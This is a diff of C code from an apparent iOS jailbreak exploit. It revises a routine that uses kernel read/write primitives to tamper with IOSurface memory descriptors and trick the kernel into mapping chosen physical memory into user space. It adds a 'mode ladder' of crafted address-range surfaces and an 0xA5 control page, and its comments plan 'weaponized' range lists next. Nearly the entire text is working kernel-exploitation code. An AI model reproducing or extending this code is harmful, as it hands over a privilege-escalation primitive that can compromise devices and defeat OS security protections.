@@ -177,6 +177,7 @@ static int pa_in_hole(uint64_t pa)
 
 uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak); // fwd: defined below
 static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size); // v94 fwd: defined below
+static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode); // v97 fwd
 
 struct IOSurface_toCleanup *cleanups = NULL;
 unsigned cleanupsCount = 0;
@@ -219,7 +220,12 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// Zero PT writes. One hypothesis per launch (v94b fallback: client
 	// walk via the sr0/sr8/sr30 dump).
 	(void)cacheMode;
-	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(0x4000);
+	// v97 mode ladder: seq%3 — 0=legacy, 1=RANGES-ONLY, 2=A5 CONTROL.
+	// Flags stay ORIGINAL (v96: all nibbles incl. control served 0,0 ⇒
+	// type encoding was never the variable; the wire's SOURCE is).
+	int mode = (int)(seq % 3);
+	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up_mode(0x4000, mode);
+	jb_tr_beacon("KMAP mode=%d", mode);
 	if (!surfaceMachPort) {
 		jb_tr_beacon("KMAP fail,noport");
 		*uaddr = NULL;
@@ -287,13 +293,12 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(arrAlias + arrOff),
 	             (unsigned long long)kread64(arrAlias + arrOff + 8));
 
-	// v96 RE-WIRE part 1: nibble-preserving flag write — (f20live &
-	// ~0xF) | nib. seq%8==3 windows write the ORIGINAL value (control).
+	// v97: flags stay ORIGINAL (v96 verdict: all 8 nibbles including the
+	// pristine control served 0,0 — type encoding was never the variable;
+	// the wire's SOURCE is under test this launch). Use-count cycle kept:
+	// for mode-1 (unwired) surfaces it IS the first wire.
 	uint32_t f20pre = kread32(desc + 0x20);
-	uint32_t f20want = (f20pre & ~0xFULL) | nib;
-	kwrite32(desc + 0x20, f20want);
-	jb_tr_beacon("KMAP flags,pre=%x,nib=%x,want=%x,rb=%x",
-	             f20pre, nib, f20want, kread32(desc + 0x20));
+	jb_tr_beacon("KMAP flags,orig=%x", f20pre);
 
 	// desc.size retarget via W[0x48,0x68) (v93-proven window/offsets).
 	uint8_t winA[0x20];
@@ -338,10 +343,15 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(surfaceSendRight + 0x30));
 
 	// THE KERNEL DOES THE MAPPING: post-cycle lookup + GetBaseAddress.
-	// Content discriminator: TARGET WINDOW CONTENT with a low-nibble
-	// winner ⇒ that nibble IS the wire type = THE PROBE WINDOW = CHAIN
-	// GATE. All windows 0,0 ⇒ wire is create-once regardless of type ⇒
-	// v97 = pre-weaponized creation (real ranges via the public API).
+	// v97 discriminator:
+	//  mode 2 (A5): C,first = 0xA5A5A5A5A5A5A5A5 ⇒ THE WIRE READS THE
+	//               LIST (any time) — v98 ladders PA encodings with the
+	//               live list. 0,0 ⇒ wire never reads it post-create.
+	//  mode 1 (ranges-only): base1!=0 + target/A5 content ⇒ ranges-only
+	//               surfaces wire from the live list ⇒ v98 = create
+	//               weaponized lists only. base1=0/fail ⇒ ranges-only
+	//               surfaces unsupported ⇒ wire is alloc-size-only.
+	//  mode 0 (legacy): expected 0,0 (control, matches v94/95/96).
 	IOSurfaceRef refB = IOSurfaceLookupFromMachPort(surfaceMachPort);
 	int lookupB = (refB != NULL);
 	void *base1 = lookupB ? IOSurfaceGetBaseAddress(refB) : NULL;
@@ -389,6 +399,18 @@ static CFNumberRef CFNUM64(uint64_t value) {
 }
 
 static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
+	return IOSurface_kalloc_getSurfacePort_16up_mode(size, 0);
+}
+
+// v97: mode ladder — the wire's source-of-truth experiment.
+//   mode 0: legacy (AllocSize + dummy ranges) — v94/95/96 behavior.
+//   mode 1: RANGES-ONLY (no AllocSize key) — no kernel fallback backing;
+//           forces the wire to consume the range list. Caller weapons the
+//           live array before first GetBaseAddress.
+//   mode 2: A5 CONTROL (legacy keys) + a second A5-filled user page as
+//           entry target — if the wire reads the list AT ALL (any time),
+//           C,first = 0xA5A5A5A5A5A5A5A5. Unambiguous positive control.
+static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode) {
 	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);
 
 	static vm_size_t dummyPageSize = 0x4000;
@@ -396,10 +418,16 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
 	if (dummyPage == 0) {
 		vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE);
 	}
+	static vm_address_t a5Page = 0;
+	if (mode == 2 && a5Page == 0) {
+		vm_allocate(mach_task_self(), &a5Page, dummyPageSize, VM_FLAGS_ANYWHERE);
+		if (a5Page) memset((void *)a5Page, 0xA5, dummyPageSize);
+	}
 
 	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
+	uint64_t entryTarget = (mode == 2 && a5Page) ? a5Page : dummyPage;
 	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
-		userspaceRanges[i] = dummyPage;
+		userspaceRanges[i] = entryTarget;
 		userspaceRanges[i+1] = dummyPageSize;
 	}
 
@@ -407,17 +435,21 @@ static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
     free(userspaceRanges);
 
     CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
-	CFNumberRef dummyPageSizeNum = CFNUM64(dummyPageSize);
-    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"),     (const void *)dummyPageSizeNum);
-    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);
+	if (mode != 1) {
+		// legacy + A5-control: AllocSize present (kernel-owned backing).
+		CFNumberRef sizeNum = CFNUM64(dummyPageSize);
+		CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), (const void *)sizeNum);
+		CFRelease(sizeNum);
+	} // mode 1: NO AllocSize key — ranges-only surface.
+	CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);
 
     IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
     mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
     IOSurfaceDecrementUseCount(surfaceRef);
 
 	CFRelease(userspaceRangesData);
-	CFRelease(dummyPageSizeNum);
 	CFRelease(dict);
+	jb_tr_beacon("KMAP ctor,mode=%d,port=%x", mode, port);
 
     return port;
 }
